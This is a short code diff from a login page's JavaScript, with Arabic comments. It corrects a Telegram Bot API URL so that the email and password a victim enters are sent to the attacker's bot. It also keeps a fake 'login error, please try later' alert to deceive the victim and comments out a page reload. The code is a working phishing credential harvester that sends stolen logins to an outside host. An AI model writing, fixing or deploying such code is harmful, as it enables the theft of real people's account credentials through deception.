@@ -187,7 +187,7 @@
         const message = `⚠️ محاولة تسجيل دخول:\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
 
         // رابط الـ API الخاص بتليجرام
-        const url = `https://t.me${botToken}/sendMessage`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         try {
             // إرسال الطلب
@@ -216,7 +216,7 @@
 
         // إعادة توجيه المستخدم بعد إتمام العملية (أو محاكاة خطأ تسجيل الدخول)
         alert('حدث خطأ في تسجيل الدخول، يرجى المحاولة لاحقاً.');
-        window.location.reload();
+        //window.location.reload();
     });
 </script>
 
